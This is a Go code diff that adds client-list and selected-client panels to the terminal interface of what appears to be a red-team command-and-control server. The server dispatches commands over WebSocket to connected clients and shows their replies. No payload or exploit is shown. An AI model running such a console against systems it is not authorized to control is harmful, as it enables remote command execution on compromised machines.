@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"log"
 	"net"
@@ -22,7 +23,18 @@ var upgrader = websocket.Upgrader{
 var clients = make(map[string]*websocket.Conn)
 var targetClient string
 var app *tview.Application
+var lastCommand string
+var selectedClient *tview.TextView
+var activeClients *tview.TextView
 var outputLog *tview.TextView
+
+func writeKeysFromMap(m map[string]*websocket.Conn, prefix string) string {
+	b := new(bytes.Buffer)
+	for key, _ := range m {
+		fmt.Fprintf(b, "%s%s\n", prefix, key)
+	}
+	return b.String()
+}
 
 func writeMessage(baseString string, args ...any) {
 	// Format the message string
@@ -32,6 +44,19 @@ func writeMessage(baseString string, args ...any) {
 	app.QueueUpdateDraw(func() {
 		if _, err := fmt.Fprint(outputLog, message); err != nil {
 			log.Printf("Error writing to outputLog: %v", err)
+		}
+		outputLog.ScrollToEnd()
+	})
+}
+
+func writeSomewhere(location *tview.TextView, baseString string, args ...any) {
+	// Format the message string
+	message := fmt.Sprintf(baseString, args...)
+
+	// Queue the update to ensure thread safety and scroll to the end
+	app.QueueUpdateDraw(func() {
+		if _, err := fmt.Fprint(location, message); err != nil {
+			log.Printf("Error writing to location: %v", err)
 		}
 		outputLog.ScrollToEnd()
 	})
@@ -57,7 +82,8 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	// Store the WebSocket connection by client IP
 	clients[clientIP] = connection
 	//log.Printf("Client connected: %s", clientIP)
-	writeMessage("Client connected: %s\n", clientIP)
+	// writeMessage("Client connected: %s\n", clientIP)
+	writeSomewhere(activeClients, "%s", writeKeysFromMap(clients, ""))
 
 	// Keep the connection open for sending commands
 	for {
@@ -71,7 +97,7 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 
 		//log.Printf("Received response from client [%s]: %s", clientIP, message)
 
-		writeMessage("%s\n", message)
+		writeMessage("[green]red@team:[-] %s\n%s\n", lastCommand, message)
 	}
 }
 
@@ -98,12 +124,27 @@ func sendCommandToClient(ip_addr string, command string) {
 		delete(clients, ip_addr)
 		return
 	}
-	writeMessage("red@team: %s\n", command)
+	//writeMessage("red@team: %s\n", command)
+	lastCommand = command
 }
 
 func main() {
 	http.HandleFunc("/ws", handleWebSocket)
 	app = tview.NewApplication()
+
+	// Selected Client
+	selectedClient = tview.NewTextView()
+	selectedClient.SetTextAlign(tview.AlignLeft).
+		SetDynamicColors(true).
+		SetBorder(true).
+		SetTitle(" Active Client ")
+
+	// Active clients
+	activeClients = tview.NewTextView()
+	activeClients.SetTextAlign(tview.AlignLeft).
+		SetDynamicColors(true).
+		SetBorder(true).
+		SetTitle(" Clients ")
 
 	// Input field for client name
 	var inputField *tview.InputField
@@ -117,6 +158,8 @@ func main() {
 				_, ok := clients[ip_addr]
 				if ok {
 					targetClient = ip_addr
+					selectedClient.SetText(ip_addr)
+					inputField.SetText("")
 				} else {
 					inputField.SetText("Invalid client IP address!")
 				}
@@ -152,7 +195,10 @@ func main() {
 
 	// Assemble the layout
 	flex := tview.NewFlex().
-		AddItem(inputField, 0, 3, true).
+		AddItem(tview.NewFlex().
+			AddItem(inputField, 0, 1, false).
+			AddItem(selectedClient, 0, 1, false).
+			AddItem(activeClients, 0, 10, false).SetDirection(tview.FlexRow), 0, 2, true).
 		AddItem(tview.NewFlex().
 			AddItem(outputLog, 0, 10, false).
 			AddItem(commandField, 0, 1, false).SetDirection(tview.FlexRow), 0, 7, false)
